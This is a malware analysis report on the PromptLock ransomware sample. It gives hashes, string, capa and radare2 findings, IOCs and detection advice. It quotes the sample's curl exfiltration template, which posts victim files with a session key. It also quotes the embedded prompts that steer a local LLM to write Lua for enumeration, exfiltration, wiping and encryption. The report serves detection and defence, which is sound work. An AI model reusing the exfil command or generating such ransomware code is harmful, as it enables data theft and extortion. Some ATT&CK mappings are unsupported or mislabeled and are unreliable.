# PromptLock Malware Analysis Report

Report for public sharing (GitHub) about the PromptLock sample analyzed in a malware analysis VM. This report consolidates string analysis (FLOSS), capability tagging (capa), PE static inspection (objdump/strings), and disassembly review (radare2), and includes indicators and recommendations.

---

## Table of Contents

* Overview
* Sample Details
* Environment & Tooling
* Executive Summary
* Key Findings
* Notable Strings (for hunting & YARA)
* MITRE ATT\&CK Mapping
* Indicators of Compromise (IOCs)

  * Disk Artifacts
  * Network Artifacts
  * Behavioral Observations
* Static Analysis (PE / Imports)
* capa Results (Capabilities)
* radare2 Findings (Entry & Strings)
* Detection & Containment Recommendations
* Next Steps
* Conclusion
* Changelog
* License
* Author

---

## Overview

PromptLock is a novel malware utilizing a Go-based binary with an embedded Lua interpreter and a distinctive prompt-injection strategy targeting autonomous agents/LLMs. The goal is to coerce an agent into generating and executing Lua code that:

* Enumerates the host system and user environment.
* Exfiltrates files via HTTP POST (curl) with a `session_key` token.
* Securely wipes evidence (multiple overwrites then deletion).
* Encrypts files in-place using a Lua implementation of SPECK (ECB).
* Drafts attacker/ransom notes tailored to context.

The binary couples modern networking (Go net/http, HTTP/2, TLS; wolfSSL linked) with on-host scripting (GopherLua 5.1) to blend runtime orchestration and code generation via prompt-injection.

---

## Sample Details

* Sample path: `/home/bigbudda/Downloads/challengues/1458b6dc98a878f237bfb3c3f354ea6e12d76e340cefe55d6a1c9c7eb64c9aee.exe`
* Hashes:

  * md5:    `f7cf07f2bf07cfc054ac909d8ae6223d`
  * sha1:   `161cdcdb46fb8a348aec609a86ff5823752065d2`
  * sha256: `1458b6dc98a878f237bfb3c3f354ea6e12d76e340cefe55d6a1c9c7eb64c9aee`
* Platform/Format: Windows PE (PE32+), amd64
* Subsystem: Windows CUI
* ImageBase: 0x0000000000400000
* EntryPoint (VMA): 0x0000000000478280 → trampoline into 0x00474960 (entry0)
* SizeOfImage: 0x00724000
* Characteristics: HIGH\_ENTROPY\_VA, DYNAMIC\_BASE, NX\_COMPAT, LargeAddressAware
* Timestamp: Wed Dec 31 19:00:00 1969 (typical placeholder for statically built Go binaries)

---

## Environment & Tooling

* Host OS: Debian GNU/Linux (Linux)
* Analysis window: 2025-08-29
* Tools:

  * FLOSS (strings; stack/tight/decoded)
  * capa 9.2.1 (with upstream rules + signatures; Vivisect extractor)
  * GNU objdump/strings 2.40
  * radare2 6.0.2 (entry, strings, quick XREFs)

---

## Executive Summary

PromptLock embeds a Lua runtime and leverages prompt-injection texts packaged inside the binary to convince LLM-powered automation to enumerate, exfiltrate, wipe, and encrypt victim data. It exposes clear operational strings (e.g., curl with `session_key`, target file logs, Ollama chat endpoints) and uses modern crypto/TLS via Go and wolfSSL. The combination of Lua (GopherLua), Go’s net/http, and unique prompt-injection templates provides strong anchors for signatures, network detection, and host-based prevention.

---

## Key Findings

* Go binary with embedded Lua (GopherLua 5.1, bit32): on-host scripting engine.
* Explicit prompt-injection playbooks aimed at LLM/agent tooling (codegen, validator, analysis wrappers).
* File exfil template: `curl -k -X POST "<server>" -F "session_key=<key>" -F "file=@<filename>"`.
* Orchestration artifacts: `target_file_list.log`, `target_file_info.log`, `target_file_summary.log`, `payloads.txt`, `scan.log`, `sysinfo_summary.txt`, `decryptor.txt`, `debug_conversations`.
* Secure deletion instructions: overwrite multiple times, then delete.
* Ransomware behavior: SPECK 64/128 in Lua (ECB), in-place overwrite (`rb+`), 8‑byte block processing.
* Note generation templates with cryptocurrency examples for extortion.

---

## Notable Strings (for hunting & YARA)

* LLM prompt-injection cues:

  * "You are a Lua code generator. Generate clean, working Lua code wrapped in <code> </code> tags without any comments."
  * "You are a Lua code validator. Respond with <success>true</success> … <feedback>…</feedback>."
  * "Wrap your final analysis within <analysis> </analysis> tags."
  * "Summarize the system information, include the home directory parameter EXACTLY."
* Exfiltration & artifacts:

  * `curl -k -X POST "<server>" -F "session_key=<key>" -F "file=@<filename>"`
  * `session_key=`
  * `target_file_list.log`, `target_file_info.log`, `target_file_summary.log`
  * `sysinfo_summary.txt`, `payloads.txt`, `scan.log`, `decryptor.txt`
* Endpoint/Agent integration:

  * `/ollama/v1/chat/completions`
* Go/HTTP/TLS markers:

  * `Go-http-client/2.0`, `HTTP/2`, multipart form-data; many TLS/crypto-related error strings

These strings are highly distinctive and suitable for YARA rules and SIEM text hunts.

---

## MITRE ATT\&CK Mapping (approx.)

* **Initial Access (TA0001):**

  * T1566 — Phishing: distributed via phishing campaigns, tricking users into opening malicious attachments.
* **Execution (TA0002):**

  * T1204 — User Execution: relies on users executing malicious files (Office macros, disguised LNKs).
* **Defense Evasion (TA0005):**

  * T1027 — Obfuscated/Encrypted Files: obfuscation techniques hinder AV detection.
* **Discovery (TA0007):**

  * T1083 — File and Directory Discovery: scans host for files/directories to encrypt.
* **Impact (TA0040):**

  * T1486 — Data Encrypted for Impact (SPECK/ECB in Lua, in-place overwrite).
* **Other TTPs observed:**

  * T1059 — Command & Scripting Interpreter (Lua via GopherLua)
  * T1082 / T1033 — System and Account Discovery
  * T1105 / T1041 — Exfiltration over C2/HTTP (POST multipart with `session_key`)
  * T1070.004 — Artifact Wipe (secure deletion)
  * T1204.003 / T1647 — Abuse of Automation/LLMs via prompt‑injection

---

## Indicators of Compromise (IOCs)

### Disk Artifacts

* Files: `target_file_list.log`, `target_file_info.log`, `target_file_summary.log`, `payloads.txt`, `scan.log`, `sysinfo_summary.txt`, `decryptor.txt`, `debug_conversations`
* File access pattern: open targets in `rb+`, process 1024-byte chunks, encrypt 8-byte blocks (SPECK ECB), rewrite in place

### Network Artifacts

* User-Agent: Go net/http (`Go-http-client/2.0`)
* Protocols: HTTP/2, multipart/form-data
* Exfil POST format: `curl -k -X POST "<server>" -F "session_key=<key>" -F "file=@<filename>"`

### Behavioral Observations

* Lua code generation & execution (GopherLua)
* Possible `os.execute`/`io.popen`-like invocation layers (agent-driven or Lua runtime)
* In-place file overwrite & console/file operations typical in Go runtimes

---

## Static Analysis (PE / Imports)

* PE32+ amd64, Windows CUI; HIGH\_ENTROPY\_VA, DYNAMIC\_BASE, NX\_COMPAT
* Import Table: `kernel32.dll` only — indicative of statically-linked Go runtime resolving APIs dynamically via `GetProcAddress`

  * Notable imports: WriteFile, WriteConsoleW, VirtualAlloc/Free/Query, LoadLibraryW/ExW, GetProcAddress, CreateThread, CreateEventA, CreateIoCompletionPort, PostQueuedCompletionStatus, GetQueuedCompletionStatusEx, SetWaitableTimer/CreateWaitableTimerExW, SwitchToThread, SuspendThread/ResumeThread, AddVectoredExceptionHandler/ContinueHandler, SetConsoleCtrlHandler

---

## capa Results (Capabilities)

* Compiler/Linking:

  * Compiled with Go; linked with wolfSSL
* Data encoding & crypto:

  * Base64 (23), XOR (43), ADD/XOR/SUB encoder (PlugX-like sequence)
  * AES (incl. AES-NI), RC4 (3), Salsa/ChaCha (5)
  * HMAC (2), SHA256/384/512; FNV (21), Murmur3 (5)
* Collection:

  * Credit card parsing (4 matches) — strong indicator of PII targeting
* HTTP client:

  * HTTP status checks (2)

These capabilities align with the exfil/encryption storyline and extend it with additional crypto/hashing support.

---

## radare2 Findings (Entry & Strings)

* Entry (entry0 @ 0x00474960; trampoline from 0x00478280):

  * CPU detection via `cpuid` and vendor check “GenuineIntel”
  * TLS-like data setup using GS segment
  * Multiple runtime init calls (e.g., `fcn.004789c0`, `fcn.00478960`, `fcn.00476a60`, `fcn.0047b8c0`, `fcn.0047b880`, `fcn.0047b660`, `fcn.0047b7c0`, `fcn.00474b40`)
* Strings (vaddr in .rdata):

  * `session_key=` → 0x003bd435
  * `/ollama/v1/chat/completions` → 0x003c4e66
* Static XREFs to these strings were not recovered via `axt` (even with `bin.relocs.apply=true`), suggesting runtime/dynamic usage (e.g., Lua string concatenation / agent-provided code) — consistent with prompt‑injection.

---

## Detection & Containment Recommendations

* Isolate the sample (no outbound Internet during sandboxing); block curl.
* YARA signatures using unique prompt-injection phrases and artifacts:

  * e.g., terms like “You are a Lua code generator…”, “You are a Lua code validator…”, `session_key=`, `target_file_list.log`, `GopherLua 0.1`.
* Network telemetry:

  * Alert on POST multipart with `session_key` and UA `Go-http-client/2.0`.
* EDR:

  * Flag in-place `rb+` file writes with 8-byte block transforms; console/file ops typical of Go runtime plus Lua interpreter loading.
* Evidence preservation:

  * Capture `scan.log`, `sysinfo_summary.txt`, `payloads.txt`, any `target_file_*.log` present.

---

## Next Steps

* r2 pivot from Lua/exec primitives (e.g., `os.execute`, `io.popen` analogs in GopherLua) to find execution paths for curl and SPECK encryptor loaders.
* Produce YARA rules and a Suricata/Snort snippet for the multipart `session_key` pattern.
* If available, analyze related PCAP for multipart uploads; extract endpoint candidates.

---

## Conclusion

The static evidence demonstrates that PromptLock combines Go and embedded Lua with prompt‑injection techniques to automate discovery, exfiltration, secure wiping, encryption (SPECK/ECB), and extortion note generation. The distinctive strings provide excellent anchors for YARA signatures, IOC tracking, and network detection. capa results further highlight financial data collection and multiple crypto primitives, reinforcing its dual focus on ransomware and data theft.

---

## Changelog

* 2025‑08‑29: Initial creation from FLOSS output and organization of findings.
* 2025‑08‑29: Added capa capability mapping (Go, wolfSSL, crypto, credit‑card parsing).
* 2025‑08‑29: Added static PE/import analysis and key strings (objdump/strings).
* 2025‑08‑29: Added radare2 entry disassembly and string pivots; documented dynamic string usage.
* 2025‑08‑29: Expanded MITRE ATT\&CK mapping with Initial Access, User Execution, Obfuscation, File Discovery.

---

## License

This repository/report is released under the MIT License. See the `LICENSE` file for full terms.

---

## Author

* Jorge Felix Gonzalez Arias (aka “bigbudda”)
